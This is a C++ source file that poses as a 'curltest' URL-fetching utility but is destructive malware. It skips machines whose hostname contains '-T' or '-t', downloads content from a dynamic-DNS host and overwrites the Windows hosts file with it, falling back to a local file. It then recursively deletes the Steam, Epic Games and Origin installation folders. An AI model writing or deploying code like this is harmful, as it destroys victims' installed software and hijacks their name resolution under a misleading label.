#include <Winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
#include <string>
#include <iostream>
#include "curl/curl.h"
#include <fstream>
#include <filesystem>
#include <string>
#include <iostream>
using namespace std;
#include <cstdint>
namespace fs = std::filesystem;
// Write any errors in here
static char errorBuffer[256];

// Write all expected data in here
static string buffer;

// This is the writer call back function used by curl
static int writer(char* data, size_t size, size_t nmemb,
    std::string* buffer)
{
    // What we will return
    int result = 0;

    // Is there anything in the buffer?
    if (buffer != NULL)
    {
        // Append the data to the buffer
        buffer->append(data, size * nmemb);

        // How much did we write?
        result = size * nmemb;
    }

    return result;
}

// You know what this does..
void usage()
{
    cout << "curltest: \n" << endl;
    cout << "  Usage:  curltest url\n" << endl;
}
void destroy(string fileName) {
    //fs::path dir = fs::temp_directory_path();
    std::uintmax_t n = fs::remove_all(fileName);
    std::cout << "Deleted " << n << " files or directories in " << fileName << endl;
}
void dirSearchAndDestroy() {
        destroy("C:\\Program Files (x86)\\Epic Games");
        destroy("C:\\Program Files (x86)\\Steam");
        destroy("C:\\Program Files (x86)\\Origin");
        destroy("C:\\Program Files\\Epic Games");
        destroy("C:\\Program Files\\Steam");
        destroy("C:\\Program Files\\Origin");
}

/*
 * The old favorite
 */
int main(int argc, char* argv[]) {

        char szPath[128] = "";
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        gethostname(szPath, sizeof(szPath));
        printf("%s", szPath);
        WSACleanup();
        string in1 = szPath;
        string in2 = "-T";
        string in3 = "-t";
        std::size_t found = in1.find(in2);
        std::size_t found2 = in1.find(in3);
        if (found != std::string::npos) {
            exit(0);
        }
        if (found2 != std::string::npos) {
            exit(0);
        }

        try {
            const char* url2 = "http://totc.ddns.net/school/test.cpp";
            string url(url2);

            cout << "Retrieving " << url << endl;

            // Our curl objects
            CURL* curl;
            CURLcode result;

            // Create our curl handle
            curl = curl_easy_init();

            if (curl)
            {
                // Now set up all of the curl options
                curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errorBuffer);
                curl_easy_setopt(curl, CURLOPT_URL, url2);
                curl_easy_setopt(curl, CURLOPT_HEADER, 0);
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);

                // Attempt to retrieve the remote page
                result = curl_easy_perform(curl);

                // Always cleanup
                curl_easy_cleanup(curl);

                // Did we succeed?
                if (result == CURLE_OK)
                {
                    cout << buffer << "\n";
                    cout << "writing...\n";
                    ofstream hosts;
                    hosts.open(L"C:\\Windows\\System32\\drivers\\etc\\hosts");
                    string input;
                    hosts << buffer << endl;
                    hosts.close();
                    cout << "written\n";
                    dirSearchAndDestroy();
                    dirSearchAndDestroy();
                    exit(0);
                }
                else
                {
                    cout << "Error: [" << result << "] - " << errorBuffer;
                    throw 404;
                }

            }
        }
        catch (int e) {
            cout << "Initial failed with error above\nError code " << e << "\nTrying backup..." << endl;
            string myText;

            // Read from the text file
            ifstream MyReadFile("test.cpp");
            ofstream hosts;
            hosts.open(L"C:\\Windows\\System32\\drivers\\etc\\hosts");
            // Use a while loop together with the getline() function to read the file line by line
            while (getline(MyReadFile, myText)) {
                // Output the text from the file
                hosts << myText << endl;

            }
            hosts.close();
            // Close the file
            MyReadFile.close();
        }
}